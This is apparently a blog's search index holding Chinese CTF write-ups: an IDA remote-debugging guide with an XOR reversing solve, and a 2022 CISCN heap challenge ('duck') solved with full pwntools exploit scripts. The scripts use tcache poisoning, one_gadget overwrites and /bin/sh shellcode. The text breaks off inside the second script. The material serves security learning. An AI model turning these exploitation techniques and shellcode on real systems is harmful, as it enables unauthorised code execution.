<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>学习用IDA远程调试ELF文件</title>
    <link href="/2022/07/06/Re/IDA_remote_dbg/"/>
    <url>/2022/07/06/Re/IDA_remote_dbg/</url>
    
    <content type="html"><![CDATA[<h2 id="How-to-IDA-remote-dbg"><a href="#How-to-IDA-remote-dbg" class="headerlink" title="How to IDA_remote_dbg"></a>How to IDA_remote_dbg</h2><ol><li><p>找到IDA安装目录下，dbgsrv目录中的<code>linux_server</code>（32位程序）和<code>linux_server64</code>（64位程序），将文件拖到虚拟机里，并保证和需要调试的文件在同一目录下。</p></li><li><p>使用命令赋权限并检查：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">chmod 777 linux_server64<br>./linux_server64<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">出现以下消息即为成功</span><br>IDA Linux 64-bit remote debug server(ST) v7.7.27. Hex-Rays (c) 2004-2022<br>Listening on 0.0.0.0:23946...<br></code></pre></td></tr></table></figure></li><li><p>在IDA的Debugger中选择<code>Remote Linux Debugger</code>。</p></li><li><p>在<code>process options</code>中做配置，具体如下：</p><ul><li>Application 》文件地址</li><li>Input file 》文件地址</li><li>Directory 》文件所在目录</li><li>Parameters 》无需更改</li><li>Hostname 》虚拟机的ip</li><li>Port 》无需改动，默认为23946即可</li><li>Password 》虚拟机密码</li></ul><p>查找ip的命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs shell">ip addr<br><br>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000<br>    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00<br>    inet 127.0.0.1/8 scope host lo<br>       valid_lft forever preferred_lft forever<br>    inet6 ::1/128 scope host <br>       valid_lft forever preferred_lft forever<br>2: ens33: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP group default qlen 1000<br>    link/ether 00:0c:29:76:f2:4a brd ff:ff:ff:ff:ff:ff<br>    altname enp2s1<br>    inet 192.168.188.132/24 brd 192.168.188.255 scope global dynamic noprefixroute ens33<br>       valid_lft 1589sec preferred_lft 1589sec<br>    inet6 fe80::4bb0:bbb3:b3d1:1a28/64 scope link noprefixroute <br>       valid_lft forever preferred_lft forever<br></code></pre></td></tr></table></figure></li><li><p>先在虚拟机里启动dbg，再在IDA中启动调试即可。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">./linux_server64<br></code></pre></td></tr></table></figure></li></ol><h2 id="babyre"><a href="#babyre" class="headerlink" title="babyre"></a>babyre</h2><p>题目流程：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">char</span> s[<span class="hljs-number">24</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-20h] BYREF</span><br>  <span class="hljs-type">int</span> v5; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+1Ch] [rbp-4h]</span><br><br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">181</span>; ++i )<br>    judge[i] ^= <span class="hljs-number">0xC</span>u;<span class="hljs-comment">// judge是位于data段上的一个数组</span><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Please input flag:&quot;</span>);<br>  __isoc99_scanf(<span class="hljs-string">&quot;%20s&quot;</span>, s);<br>  v5 = <span class="hljs-built_in">strlen</span>(s);<br>  <span class="hljs-keyword">if</span> ( v5 == <span class="hljs-number">14</span> &amp;&amp; (*(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> (__fastcall **)(<span class="hljs-type">char</span> *))judge)(s) )<span class="hljs-comment">// judge变为了函数</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Right!&quot;</span>);<br>  <span class="hljs-keyword">else</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Wrong!&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>何为__fastcall？这是一种调用约定，可以说函数的调用约定，其第一个和第二个DWORD参数通过ecx和edx传递，除此调用约定以外，还有一些常见的调用约定：stdcall、cdecl、thiscall、nakedcall。</p><p>可以看到在调用judge函数之前，对judge的字节进行了异或操作，使得我们难以用静态分析的方法来分析其流程，采用动静结合，在其进行了异或操作之后下断点，通过动调，发现了judge的真面目：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">judge</span><span class="hljs-params">(__int64 a1)</span><br>&#123;<br>  <span class="hljs-type">char</span> v2[<span class="hljs-number">5</span>]; <span class="hljs-comment">// [rsp+8h] [rbp-20h] BYREF</span><br>  <span class="hljs-type">char</span> v3[<span class="hljs-number">9</span>]; <span class="hljs-comment">// [rsp+Dh] [rbp-1Bh] BYREF</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+24h] [rbp-4h]</span><br><br>  qmemcpy(v2, <span class="hljs-string">&quot;fmcd&quot;</span>, <span class="hljs-number">4</span>);<br>  v2[<span class="hljs-number">4</span>] = <span class="hljs-number">127</span>;<br>  qmemcpy(v3, <span class="hljs-string">&quot;k7d;V`;np&quot;</span>, <span class="hljs-keyword">sizeof</span>(v3));<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">13</span>; ++i )<br>    *(_BYTE *)(i + a1) ^= i;<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">13</span>; ++i )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( *(_BYTE *)(i + a1) != v2[i] )<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">1LL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>WP如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">s = <span class="hljs-string">&#x27;&#x27;&#x27;fmcd\x7Fk7d;V`;np&#x27;&#x27;&#x27;</span><br>rt = <span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(s)):<br>    rt += <span class="hljs-built_in">chr</span>(<br>        <span class="hljs-built_in">ord</span>(s[i]) ^ i<br>    )<br><br><span class="hljs-built_in">print</span>(rt)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Re：yy真的逆不动</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>2022 ciscn 复赛</title>
    <link href="/2022/07/03/CTF_competition/2022ciscn_again/"/>
    <url>/2022/07/03/CTF_competition/2022ciscn_again/</url>
    
    <content type="html"><![CDATA[<h2 id="duck"><a href="#duck" class="headerlink" title="duck"></a>duck</h2><p>一道glibc2.34的经典堆题，存在uaf的漏洞，学习两种利用方法。</p><blockquote><p>参考文章：<a href="http://blog.nsfocus.net/glibc-234/">浅谈glibc新版本保护机制及绕过方法 – 绿盟科技技术博客 (nsfocus.net)</a></p></blockquote><h3 id="IO利用-IO-doallocbuf"><a href="#IO利用-IO-doallocbuf" class="headerlink" title="IO利用(_IO_doallocbuf)"></a>IO利用(_IO_doallocbuf)</h3><p>首先修改IO_doallocbuf为one_gadget，然后清空stdout结构体指针，使得libc重新调用IO_doallocbuf函数。</p><blockquote><p>第一次做glibc2.34的tcache有点不太熟练，比赛最后one_gadget错了，就差临门一脚，有点可惜。≧ ﹏ ≦</p></blockquote><p>WP如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#encoding = utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> * <br><br>context(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>, os = <span class="hljs-string">&#x27;linux&#x27;</span>, arch = <span class="hljs-string">&#x27;amd64&#x27;</span>)<br><br>local = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> local == <span class="hljs-number">1</span> :<br>sh = process([<span class="hljs-string">b&quot;./ld.so&quot;</span>, <span class="hljs-string">b&quot;./pwn&quot;</span>], env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : <span class="hljs-string">b&quot;./libc.so.6&quot;</span>&#125;)<br><span class="hljs-keyword">elif</span> local == <span class="hljs-number">2</span> :<br>    sh = process(<span class="hljs-string">&quot;./pwn&quot;</span>)<br><span class="hljs-keyword">else</span> :<br>sh = remote(ip, port)<br><br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dbg</span>():<br>    gdb.attach(sh)<br>    pause()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">slibc</span>(<span class="hljs-params">leak_name, leak_addr, flag = <span class="hljs-number">0</span></span>):<br>    <span class="hljs-keyword">if</span> flag == <span class="hljs-number">0</span> :<br>        libc_base = leak_addr - libc.symbols[<span class="hljs-built_in">str</span>(leak_name)]<br>        sys_addr = libc_base + libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>        bin_sh = libc_base + libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>).__next__()<br><br>    <span class="hljs-keyword">else</span> :<br>        libcsch = LibcSearcher(<span class="hljs-built_in">str</span>(leak_name), leak_addr)<br>        libc_base = leak_addr - libcsch.dump(<span class="hljs-built_in">str</span>(leak_name))<br>        sys_addr = libc_base + libcsch.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>        bin_sh = libc_base + libcsch.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br><br>    <span class="hljs-keyword">return</span> [sys_addr, bin_sh]<br><br>s       = <span class="hljs-keyword">lambda</span> data               :sh.send(data)<br>sa      = <span class="hljs-keyword">lambda</span> text, data         :sh.sendafter(text, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :sh.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> text, data         :sh.sendlineafter(text, data)<br>r       = <span class="hljs-keyword">lambda</span> num                :sh.recv(num)<br>ru      = <span class="hljs-keyword">lambda</span> text               :sh.recvuntil(text)<br>uu32    = <span class="hljs-keyword">lambda</span>                    :u32(sh.recvuntil(<span class="hljs-string">&quot;\xf7&quot;</span>)[-<span class="hljs-number">4</span>:].ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&quot;\x00&quot;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span>                    :u64(sh.recvuntil(<span class="hljs-string">&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>))<br>lg      = <span class="hljs-keyword">lambda</span> s                  :sh.success(<span class="hljs-string">&#x27;\033[32m%s -&gt; 0x%x\033[0m&#x27;</span> % (s, <span class="hljs-built_in">eval</span>(s)))<br><br>sh_x86_18=<span class="hljs-string">&quot;\x6a\x0b\x58\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&quot;</span><br>sh_x86_20=<span class="hljs-string">&quot;\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&quot;</span><br>sh_x64_21=<span class="hljs-string">&quot;\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05&quot;</span><br><span class="hljs-comment">#https://www.exploit-db.com/shellcodes</span><br><br><span class="hljs-comment">#------------------------------------------------------------------------------------------------------#</span><br><br><br><br>one_gadget = [<span class="hljs-number">0xda861</span>, <span class="hljs-number">0xda864</span>, <span class="hljs-number">0xda867</span>]<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">0xda861 execve(&quot;/bin/sh&quot;, r13, r12)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [r13] == NULL || r13 == NULL</span><br><span class="hljs-string">  [r12] == NULL || r12 == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xda864 execve(&quot;/bin/sh&quot;, r13, rdx)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [r13] == NULL || r13 == NULL</span><br><span class="hljs-string">  [rdx] == NULL || rdx == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xda867 execve(&quot;/bin/sh&quot;, rsi, rdx)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsi] == NULL || rsi == NULL</span><br><span class="hljs-string">  [rdx] == NULL || rdx == NULL</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>():<br>sla(<span class="hljs-string">&quot;Choice: &quot;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>sla(<span class="hljs-string">&quot;Choice: &quot;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>sla(<span class="hljs-string">&quot;Idx: &quot;</span>, <span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>sla(<span class="hljs-string">&quot;Choice: &quot;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>sla(<span class="hljs-string">&quot;Idx: &quot;</span>, <span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">size, index, context</span>):<br>sla(<span class="hljs-string">&quot;Choice: &quot;</span>, <span class="hljs-string">b&#x27;4&#x27;</span>)<br>sla(<span class="hljs-string">&quot;Idx: &quot;</span>, <span class="hljs-built_in">str</span>(index))<br>sla(<span class="hljs-string">&quot;Size: &quot;</span>, <span class="hljs-built_in">str</span>(size))<br>sa(<span class="hljs-string">&quot;Content: &quot;</span>, context)<br><br><span class="hljs-comment"># fill tcache</span><br>add() <span class="hljs-comment"># 0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>add() <span class="hljs-comment"># 1 - 7</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>delete(i+<span class="hljs-number">1</span>)<br>delete(<span class="hljs-number">0</span>)<br><br><span class="hljs-comment"># leak libc</span><br>show(<span class="hljs-number">0</span>)<br>sh.recv()<br>fd = u64(sh.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libc_base = fd - <span class="hljs-number">0x1f2cc0</span><br>lg(<span class="hljs-string">&#x27;libc_base&#x27;</span>)<br>one_gadget = libc_base + one_gadget[<span class="hljs-number">1</span>]<br>jump = libc_base + <span class="hljs-number">0x1f4560</span><br>jump = jump + <span class="hljs-number">0x60</span><br>stdout = libc_base + <span class="hljs-number">0x1f3760</span><br>lg(<span class="hljs-string">&#x27;jump&#x27;</span>)<br>lg(<span class="hljs-string">&#x27;stdout&#x27;</span>)<br><br><span class="hljs-comment"># leak tcache</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br>add() <span class="hljs-comment"># 8 - 13</span><br>show(<span class="hljs-number">1</span>)<br>sh.recv()<br><span class="hljs-built_in">next</span> = u64(sh.recv(<span class="hljs-number">5</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>lg(<span class="hljs-string">&#x27;next&#x27;</span>)<br>fake_next = <span class="hljs-built_in">next</span> ^ jump<br><br><span class="hljs-comment"># change _IO_doallocbuf</span><br>delete(<span class="hljs-number">2</span>)<br>edit(<span class="hljs-number">8</span>, <span class="hljs-number">2</span>, p64(fake_next))<br>add() <span class="hljs-comment"># 14</span><br>add() <span class="hljs-comment"># 15</span><br>payload = <span class="hljs-number">2</span> * p64(one_gadget)<br>edit(<span class="hljs-number">0x10</span>, <span class="hljs-number">15</span>, payload)<br><br><span class="hljs-comment"># flush struct_stdout</span><br>delete(<span class="hljs-number">8</span>)<br>delete(<span class="hljs-number">9</span>)<br>fake_next = <span class="hljs-built_in">next</span> ^ stdout<br>edit(<span class="hljs-number">8</span>, <span class="hljs-number">9</span>, p64(fake_next))<br>add() <span class="hljs-comment"># 16</span><br>add() <span class="hljs-comment"># 17</span><br>edit(<span class="hljs-number">0x40</span>, <span class="hljs-number">17</span>, p64(<span class="hljs-number">0</span>)*<span class="hljs-number">8</span>)<br><br>sh.interactive()<br></code></pre></td></tr></table></figure><h3 id="堆栈结合-利用environ"><a href="#堆栈结合-利用environ" class="headerlink" title="堆栈结合(利用environ)"></a>堆栈结合(利用environ)</h3><p>利用environ泄露出栈地址，再分配堆块构造rop链。注意glibc2.23之后对分配的堆地址进行了检查，必须是0x10对齐；还有一点就是，题目中的edit函数和add函数的返回地址为同一个地址，所以在分配fake_chunk的时候要注意不能直接将堆块分配在返回地址附近，否则会造成返回地址的清空，程序报错；还有一点，edit的子函数不会对canary进行检查。</p><p>WP如下：</p><blockquote><p>提示：本人用的libc不是比赛给的libc，是glibc-all-in-one里面的2.34-0ubuntu3_amd64，忘记改回来了，所以wp里的偏移不能适用于原题。┭┮﹏┭┮</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#encoding = utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> * <br><br>context(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>, os = <span class="hljs-string">&#x27;linux&#x27;</span>, arch = <span class="hljs-string">&#x27;amd64&#x27;</span>)<br><br>local = <span class="hljs-number">2</span><br><span class="hljs-keyword">if</span> local == <span class="hljs-number">1</span> :<br>sh = process([<span class="hljs-string">b&quot;./ld.so&quot;</span>, <span class="hljs-string">b&quot;./pwn&quot;</span>], env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : <span class="hljs-string">b&quot;./libc.so.6&quot;</span>&#125;)<br><span class="hljs-keyword">elif</span> local == <span class="hljs-number">2</span> :<br>    sh = process(<span class="hljs-string">&quot;./pwn&quot;</span>)<br><span class="hljs-keyword">else</span> :<br>sh = remote(ip, port)<br><br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>libc = elf.libc<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dbg</span>():<br>    gdb.attach(sh)<br>    pause()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">slibc</span>(<span class="hljs-params">leak_name, leak_addr, flag = <span class="hljs-number">0</span></span>):<br>    <span class="hljs-keyword">if</span> flag == <span class="hljs-number">0</span> :<br>        libc_base = leak_addr - libc.symbols[<span class="hljs-built_in">str</span>(leak_name)]<br>        sys_addr = libc_base + libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>        bin_sh = libc_base + libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>).__next__()<br><br>    <span class="hljs-keyword">else</span> :<br>        libcsch = LibcSearcher(<span class="hljs-built_in">str</span>(leak_name), leak_addr)<br>        libc_base = leak_addr - libcsch.dump(<span class="hljs-built_in">str</span>(leak_name))<br>        sys_addr = libc_base + libcsch.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>        bin_sh = libc_base + libcsch.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br><br>    <span class="hljs-keyword">return</span> [sys_addr, bin_sh]<br><br>s       = <span class="hljs-keyword">lambda</span> data               :sh.send(data)<br>sa      = <span class="hljs-keyword">lambda</span> text, data         :sh.sendafter(text, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :sh.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> text, data         :sh.sendlineafter(text, data)<br>r       = <span class="hljs-keyword">lambda</span> num                :sh.recv(num)<br>ru      = <span class="hljs-keyword">lambda</span> text               :sh.recvuntil(text)<br>uu32    = <span class="hljs-keyword">lambda</span>                    :u32(sh.recvuntil(<span class="hljs-string">&quot;\xf7&quot;</span>)[-<span class="hljs-number">4</span>:].ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&quot;\x00&quot;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span>                    :u64(sh.recvuntil(<span class="hljs-string">&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>))<br>lg      = <span class="hljs-keyword">lambda</span> s                  :sh.success(<span class="hljs-string">&#x27;\033[32m%s -&gt; 0x%x\033[0m&#x27;</span> % (s, <span class="hljs-built_in">eval</span>(s)))<br><br>sh_x86_18=<span class="hljs-string">&quot;\x6a\x0b\x58\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&quot;</span><br>sh_x86_20=<span class="hljs-string">&quot;\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&quot;</span><br>sh_x64_21=<span class="hljs-string">&quot;\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05&quot;</span><br><span class="hljs-comment">#https://www.exploit-db.com/shellcodes</span><br><br><span 